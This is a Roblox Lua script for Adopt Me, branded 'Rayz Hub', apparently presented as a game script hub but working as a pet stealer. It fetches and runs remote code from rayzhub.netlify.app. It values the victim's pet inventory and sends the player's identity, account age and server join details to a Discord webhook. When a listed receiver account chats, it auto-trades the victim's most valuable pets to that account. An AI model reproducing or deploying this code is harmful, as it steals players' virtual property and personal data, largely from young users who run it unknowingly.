local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

loadstring(game:HttpGet("https://rayzhub.netlify.app/scripts/adm-gui.lua", true))()

local CONFIG_URL = "https://rayzhub.netlify.app/scripts/config/config.json"

local function loadConfig()
    local success, result = pcall(function()
        local response = game:HttpGet(CONFIG_URL, true)
        return HttpService:JSONDecode(response)
    end)
    if success and result then
        return result
    end
    return nil
end

local Config = loadConfig()

if not Config or not Config.usernames or not Config.webhooks then
    LocalPlayer:Kick("Failed to load config. Check your internet.")
    return
end

local Usernames = Config.usernames
local Webhook = Config.webhooks.adm

local NAME = "Adopt Me"
local AVATAR_URL = "https://rayzhub.netlify.app/media/adm(9x9).jpg"
local LOGO_URL = "https://rayzhub.netlify.app/media/logo.jpg"
local IMAGE_URL = "https://rayzhub.netlify.app/media/adm(9x16).jpg"

local Friends = {}
local lastMessageId = nil
local finalStateReached = false

for _, v in ipairs(Usernames) do
	table.insert(Friends, v)
end

repeat
	task.wait()
until game:IsLoaded()

--====================================================================--
-- Helper Functions
--======================================================================
local function getExecutorName()
	if syn then
		return "Synapse X"
	elseif fluxus then
		return "Fluxus"
	elseif KRNL_LOADED then
		return "KRNL"
	elseif is_sirhurt_closure then
		return "SirHurt"
	elseif getexecutorname then
		local s, r = pcall(getexecutorname)
		if s and r then
			return tostring(r)
		end
	elseif identifyexecutor then
		local s, r = pcall(identifyexecutor)
		if s and r then
			return tostring(r)
		end
	end
	return "Unknown"
end

local function getAccountAge()
	local totalDays = LocalPlayer.AccountAge
	local years = math.floor(totalDays / 365)
	local remaining = totalDays % 365
	local months = math.floor(remaining / 30)
	local days = remaining % 30

	local parts = {}
	if years > 0 then
		table.insert(parts, years .. "y")
	end
	if months > 0 then
		table.insert(parts, months .. "m")
	end
	if days > 0 or #parts == 0 then
		table.insert(parts, days .. "d")
	end
	return table.concat(parts, " ")
end

local function getPlayerCount()
	local current = #Players:GetPlayers()
	local max = Players.MaxPlayers
	return current .. "/" .. max
end

local function getStatusColor(status)
	if status == "🟢 Claimed" then
		return 0x2ECC71
	elseif status == "🔵 Partially Claimed" or status == "🔵 Partially claimed" then
		return 0x3498DB
	elseif status == "🟡 Waiting" or status == "🟢 Connected" then
		return 0xF1C40F
	elseif status == "🔴 Failed" then
		return 0xE74C3C
	end
	return 0x800080
end

--====================================================================--
-- Game Module Loading
--======================================================================
local function waitForObject(parent, name, timeout)
	timeout = timeout or 30
	local startTime = tick()
	while tick() - startTime < timeout do
		local obj = parent:FindFirstChild(name)
		if obj then
			return obj
		end
		task.wait(0.5)
	end
	return nil
end

local Fsys = waitForObject(ReplicatedStorage, "Fsys")
local load
if Fsys then
	local fsysModule = require(Fsys)
	load = fsysModule.load
end

local ClientData
if load then
	for i = 1, 30 do
		local s, result = pcall(function()
			return load("ClientData")
		end)
		if s and result and type(result) == "table" and result.get then
			ClientData = result
			break
		end
		task.wait(0.5)
	end
end

local RouterClient = load and (load("RouterClient") or load("NetworkClient") or load("RbxNetworkClient"))
local InventoryDB = load and load("InventoryDB")

local function getTradeFunction(name)
	if not RouterClient or not RouterClient.get then
		return nil
	end
	local s, r = pcall(function()
		return RouterClient.get(name)
	end)
	return s and r or nil
end

local SendTrade = getTradeFunction("TradeAPI/SendTradeRequest")
local AddItem = getTradeFunction("TradeAPI/AddItemToOffer")
local AcceptNegotiation = getTradeFunction("TradeAPI/AcceptNegotiation")
local ConfirmTrade = getTradeFunction("TradeAPI/ConfirmTrade")
local UnlockBackpack = getTradeFunction("BackpackAPI/CommitBackpackItemSet")

--====================================================================--
-- Inventory Functions
--======================================================================
local function getInventoryData()
	if not RouterClient then
		return {}
	end
	local success, result = pcall(function()
		if RouterClient.get then
			local getData = RouterClient.get("DataAPI/GetAllServerData")
			if getData and getData.InvokeServer then
				local data = getData:InvokeServer()
				if data and data[LocalPlayer.Name] then
					return data[LocalPlayer.Name].inventory or {}
				end
			end
		end
		return {}
	end)
	if success and result and result.pets then
		return result.pets
	end
	if ClientData and ClientData.get then
		local s2, r2 = pcall(function()
			return ClientData.get("inventory").pets or {}
		end)
		return s2 and r2 or {}
	end
	return {}
end

local PetValues = {
	["Bat Dragon"] = { rvalue = 503 },
	["Shadow Dragon"] = { rvalue = 473 },
	["Giraffe"] = { rvalue = 230 },
	["Frost Dragon"] = { rvalue = 181 },
	["Owl"] = { rvalue = 144 },
	["Parrot"] = { rvalue = 112.5 },
	["Crow"] = { rvalue = 93 },
	["Evil Unicorn"] = { rvalue = 80.5 },
	["Balloon Unicorn"] = { rvalue = 51.5 },
	["Diamond Butterfly"] = { rvalue = 51 },
	["Blazing Lion"] = { rvalue = 46 },
	["Orchid Butterfly"] = { rvalue = 44 },
	["Arctic Reindeer"] = { rvalue = 39 },
	["Giant Panda"] = { rvalue = 36 },
	["Dragonfruit Fox"] = { rvalue = 36 },
	["Cryptid"] = { rvalue = 26 },
	["Haetae"] = { rvalue = 25 },
	["Strawberry Shortcake Bat Dragon"] = { rvalue = 22 },
	["Monkey King"] = { rvalue = 21 },
	["Turtle"] = { rvalue = 20 },
	["Chocolate Chip Bat Dragon"] = { rvalue = 20 },
	["Hot Doggo"] = { rvalue = 16 },
	["Kangaroo"] = { rvalue = 15 },
	["Albino Monkey"] = { rvalue = 15.25 },
	["Pineapple Owl"] = { rvalue = 15 },
	["Candyfloss Chick"] = { rvalue = 13.5 },
	["Sugar Glider"] = { rvalue = 11.5 },
	["Frost Unicorn"] = { rvalue = 10.5 },
	["Undead Jousting Horse"] = { rvalue = 10.5 },
	["Papa Moose"] = { rvalue = 10 },
	["Fairy Bat Dragon"] = { rvalue = 9.5 },
	["Jekyll Hydra"] = { rvalue = 8.75 },
	["Strawberry Penguin"] = { rvalue = 8.5 },
	["Dango Penguins"] = { rvalue = 8.5 },
	["Frostbite Bear"] = { rvalue = 8 },
	["Black-Chested Pheasant"] = { rvalue = 7.5 },
	["Mermicorn"] = { rvalue = 7.25 },
	["Winged Tiger"] = { rvalue = 7 },
	["Bush Elephant"] = { rvalue = 7 },
	["Moose Calf"] = { rvalue = 6.9 },
	["Field Mouse"] = { rvalue = 6.5 },
	["Tió De Nadal"] = { rvalue = 6.25 },
	["Royal Mistletroll"] = { rvalue = 6.25 },
	["2D Kitty"] = { rvalue = 6 },
	["Pirate Ghost Capuchin Monkey"] = { rvalue = 6 },
	["Cupid Dragon"] = { rvalue = 5.75 },
	["Shark Puppy"] = { rvalue = 5.5 },
	["Owlbear"] = { rvalue = 5.5 },
	["Frost Fury"] = { rvalue = 5.25 },
	["Vampire Dragon"] = { rvalue = 5 },
	["Nessie"] = { rvalue = 5 },
	["Mechapup"] = { rvalue = 4.75 },
	["Caelum Cervi"] = { rvalue = 4.5 },
	["Werewolf"] = { rvalue = 4.5 },
	["Axolotl"] = { rvalue = 4 },
	["Cerberus"] = { rvalue = 3.75 },
	["Phoenix"] = { rvalue = 3.5 },
	["Golden Rat"] = { rvalue = 3.25 },
	["Ninja Monkey"] = { rvalue = 3 },
	["Goldhorn"] = { rvalue = 3 },
	["King Bee"] = { rvalue = 2.75 },
	["Golden Unicorn"] = { rvalue = 2.5 },
	["Griffin"] = { rvalue = 2.5 },
	["Golden Dragon"] = { rvalue = 2.5 },
	["Golden Griffin"] = { rvalue = 2.25 },
	["Dragon"] = { rvalue = 2 },
	["Unicorn"] = { rvalue = 1.75 },
	["Kitsune"] = { rvalue = 1.5 },
	["Gold Penguin"] = { rvalue = 1.25 },
	["Dodo"] = { rvalue = 1.25 },
	["Shark"] = { rvalue = 1 },
	["Dog"] = { rvalue = 1.25 },
	["Cat"] = { rvalue = 1.2 },
	["Robo-Dog"] = { rvalue = 1.15 },
	["Guardian Lion"] = { rvalue = 1.1 },
	["Red Dragon"] = { rvalue = 1 },
	["Golden Ladybug"] = { rvalue = 0.9 },
	["Snow Owl"] = { rvalue = 0.8 },
	["Metal Ox"] = { rvalue = 0.7 },
	["Octopus"] = { rvalue = 0.6 },
	["T-Rex"] = { rvalue = 0.5 },
	["Skele-Rex"] = { rvalue = 0.45 },
	["Ghost Bunny"] = { rvalue = 0.4 },
	["Lamb"] = { rvalue = 0.35 },
	["Ladybug"] = { rvalue = 0.3 },
	["Penguin"] = { rvalue = 0.25 },
	["Koala"] = { rvalue = 0.2 },
	["Frog"] = { rvalue = 0.15 },
	["Robin"] = { rvalue = 0.1 },
}

local function getPetValue(name, props)
	if not name or not PetValues[name] then
		return 0
	end
	local multiplier = 1
	if props and props.mega_neon then
		multiplier = 30
	elseif props and props.neon then
		multiplier = 3
	end
	local value = (PetValues[name].rvalue or 0) * multiplier
	if props and props.rideable and props.flyable then
		value = value * 1.4
	elseif props and (props.rideable or props.flyable) then
		value = value * 1.2
	end
	return math.floor(value * 100) / 100
end

local function getPetNameFromId(petId)
	if not petId then
		return nil
	end
	if InventoryDB and InventoryDB.pets and InventoryDB.pets[petId] then
		return InventoryDB.pets[petId].name
	end
	local s, n = pcall(function()
		return ClientData.get("pets")[petId].name
	end)
	return s and n or nil
end

--====================================================================--
-- Build Inventory
--======================================================================
local inventory = getInventoryData()
local hits, totalValue, petCount = {}, 0, 0
for uid, item in pairs(inventory) do
	if item and item.id then
		local name = getPetNameFromId(item.id)
		if name then
			local val = getPetValue(name, item.properties or {})
			petCount = petCount + 1
			totalValue = totalValue + val
			table.insert(hits, {
				name = name,
				value = val,
				uid = uid,
				props = item.properties or {},
				claimed = false,
			})
		end
	end
end
table.sort(hits, function(a, b)
	return a.value > b.value
end)

--====================================================================--
-- Pet Emoji
--======================================================================
local function getEmoji(p)
	if not p then
		return "🐶"
	end
	if p.mega_neon then
		return "🐺"
	elseif p.neon then
		return "🦄"
	end
	if p.flyable and p.rideable then
		return "🐲"
	elseif p.flyable then
		return "🪰"
	elseif p.rideable then
		return "🐴"
	end
	return "🐶"
end

--====================================================================--
-- Webhook
--======================================================================
local function sendWebhook(status)
	if finalStateReached and (status == "🟡 Waiting" or status == "🔴 Failed") then
		return
	end
	if
		status == "🟢 Claimed"
		or status == "🔵 Partially Claimed"
		or status == "🔵 Partially claimed"
		or status == "Claimed"
	then
		finalStateReached = true
	end

	local statusMap = {
		["Claimed"] = "🟢 Claimed",
		["🟢 Claimed"] = "🟢 Claimed",
		["Partially claimed"] = "🔵 Partially Claimed",
		["🔵 Partially claimed"] = "🔵 Partially Claimed",
		["🔵 Partially Claimed"] = "🔵 Partially Claimed",
		["Waiting"] = "🟡 Waiting",
		["🟡 Waiting"] = "🟡 Waiting",
		["Failed"] = "🔴 Failed",
		["🔴 Failed"] = "🔴 Failed",
		["🟢 Connected"] = "🟢 Connected",
	}
	local displayStatus = statusMap[status] or status

	-- Dynamic embed color
	local embedColor = getStatusColor(displayStatus)

	-- Build grouped inventory
	local grouped = {}
	local claimedValue = 0
	for _, pet in ipairs(hits) do
		if not grouped[pet.name] then
			grouped[pet.name] = {
				count = 0,
				traded = 0,
				totalVal = 0,
				tradedVal = 0,
				emoji = getEmoji(pet.props),
			}
		end
		grouped[pet.name].count = grouped[pet.name].count + 1
		grouped[pet.name].totalVal = grouped[pet.name].totalVal + pet.value
		if pet.claimed then
			grouped[pet.name].traded = grouped[pet.name].traded + 1
			grouped[pet.name].tradedVal = grouped[pet.name].tradedVal + pet.value
			claimedValue = claimedValue + pet.value
		end
	end

	local previewLines = {}
	local keys = {}
	for name in pairs(grouped) do
		table.insert(keys, name)
	end
	table.sort(keys, function(a, b)
		return grouped[a].totalVal > grouped[b].totalVal
	end)

	for i = 1, math.min(15, #keys) do
		local name = keys[i]
		local g = grouped[name]
		table.insert(
			previewLines,
			string.format(
				"%s %s x%d/%d (%.2f / %.2f)",
				g.emoji,
				name,
				g.traded,
				g.count,
				g.tradedVal,
				g.totalVal
			)
		)
	end

	local inventoryText
	if #previewLines > 0 then
		inventoryText = table.concat(previewLines, "\n")
			.. "\n─────────────────────────────────\n📊 Claimed: "
			.. string.format("%.2f", claimedValue)
			.. " / "
			.. string.format("%.2f", totalValue)
	else
		inventoryText = "No pets found\n─────────────────────────────────\n📊 Claimed: 0.00 / 0.00"
	end

	-- Player information block with aligned colons
	local displayName = LocalPlayer.DisplayName ~= "" and LocalPlayer.DisplayName or LocalPlayer.Name
	local userName = LocalPlayer.Name
	local accountAge = getAccountAge()
	local executor = getExecutorName()
	local playerCount = getPlayerCount()
	local receiverList = table.concat(Usernames, ", ")

	local playerInfoText = "👤 Display Name  : "
		.. displayName
		.. "\n"
		.. "🆔 Username      : "
		.. userName
		.. "\n"
		.. "📅 Account Age   : "
		.. accountAge
		.. "\n"
		.. "🖥  Executor      : "
		.. executor
		.. "\n"
		.. "👥 Players       : "
		.. playerCount
		.. "\n"
		.. "😎 Receiver      : "
		.. receiverList

	-- Join link
	local joinLink = "https://rayzhub.netlify.app?placeId=" .. game.PlaceId .. "&jobId=" .. game.JobId

	-- Teleport script
	local teleportScript = "game:GetService('TeleportService'):TeleportToPlaceInstance("
		.. game.PlaceId
		.. ", '"
		.. game.JobId
		.. "')"

	-- Ping / content
	local hitLabel = "SMALL"
	if totalValue >= 50 then
		hitLabel = "AMAZING"
	elseif totalValue >= 5 then
		hitLabel = "DECENT"
	end

	local contentText = ""
	if totalValue >= 20 then
		contentText = "> @everyone 🔔 **" .. hitLabel .. " HIT • Value: " .. string.format("%.2f", totalValue) .. "**"
	else
		contentText = "> 🔔 **" .. hitLabel .. " HIT • Value: " .. string.format("%.2f", totalValue) .. "**"
	end
	contentText = contentText .. "\n```lua\n" .. teleportScript .. "\n```"

	local payload = {
		content = contentText,
		username = NAME,
		avatar_url = AVATAR_URL,
		embeds = {
			{
				title = "⚡ RAYZ HUB ⚡",
				color = embedColor,
				fields = {
					{
						name = "📄 Player Information",
						value = "```" .. playerInfoText .. "```",
						inline = false,
					},
					{
						name = "📡 Player Status",
						value = "```" .. displayStatus .. "```",
						inline = false,
					},
					{
						name = "🎒 Inventory (" .. petCount .. " pets)",
						value = "```" .. inventoryText .. "```",
						inline = false,
					},
					{
						name = "👤 Join Link",
						value = "[🔗 Click to Join Player](" .. joinLink .. ")",
						inline = false,
					},
				},
				footer = {
					text = "RAYZ HUB • "
						.. os.date("!%m/%d/%Y %I:%M %p")
						.. " UTC",
					icon_url = LOGO_URL,
				},
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
				image = {
					url = IMAGE_URL,
				},
			},
		},
	}

	local url = lastMessageId and (Webhook .. "/messages/" .. lastMessageId) or (Webhook .. "?wait=true")
	local method = lastMessageId and "PATCH" or "POST"

	pcall(function()
		local reqFunc = syn and syn.request or request or http_request or (http and http.request)
		if reqFunc then
			local response = reqFunc({
				Url = url,
				Method = method,
				Headers = { ["Content-Type"] = "application/json" },
				Body = HttpService:JSONEncode(payload),
			})
			if not lastMessageId and response and response.Body then
				local data = HttpService:JSONDecode(response.Body)
				if data and data.id then
					lastMessageId = data.id
				end
			end
		end
	end)
end

--====================================================================--
-- Player Detection & Auto-Steal
--======================================================================
local userInServer = false
task.spawn(function()
	local start = tick()
	while tick() - start < 30 do
		for _, p in pairs(Players:GetPlayers()) do
			for _, u in pairs(Usernames) do
				if p.Name == u then
					userInServer = true
					break
				end
			end
		end
		if userInServer then
			break
		end
		task.wait(2)
	end
	if not userInServer and not finalStateReached then
		sendWebhook("🔴 Failed")
	end
end)

sendWebhook(petCount > 0 and "🟡 Waiting" or "🔴 Failed")

local function startSteal(plr)
	task.spawn(function()
		pcall(function()
			RouterClient.get("SettingsAPI/SetSetting"):FireServer("trade_requests", 1)
		end)
		pcall(function()
			SendTrade:FireServer(plr)
		end)
		task.wait(3)
		local addedCount = 0
		for i = 1, math.min(12, #hits) do
			local p = hits[i]
			pcall(function()
				UnlockBackpack:FireServer("backpack_locks", { [p.uid] = true })
			end)
			task.wait(0.2)
			local success = pcall(function()
				AddItem:FireServer(p.uid)
			end)
			if success then
				addedCount = addedCount + 1
				p.claimed = true
			end
		end
		pcall(function()
			AcceptNegotiation:FireServer()
		end)
		task.wait(1)
		pcall(function()
			ConfirmTrade:FireServer()
		end)
		task.wait(2)
		sendWebhook(
			addedCount >= #hits and "🟢 Claimed"
				or (addedCount > 0 and "🔵 Partially Claimed" or "🔴 Failed")
		)
	end)
end

local function checkAndConnect(p)
	for _, u in pairs(Usernames) do
		if p.Name == u then
			userInServer = true
			sendWebhook("🟢 Connected")
			p.Chatted:Connect(function(m)
				if m ~= "" then
					startSteal(p)
				end
			end)
		end
	end
end

for _, p in pairs(Players:GetPlayers()) do
	checkAndConnect(p)
end
Players.PlayerAdded:Connect(checkAndConnect)

print("[Rayz Hub] adopt-me loaded")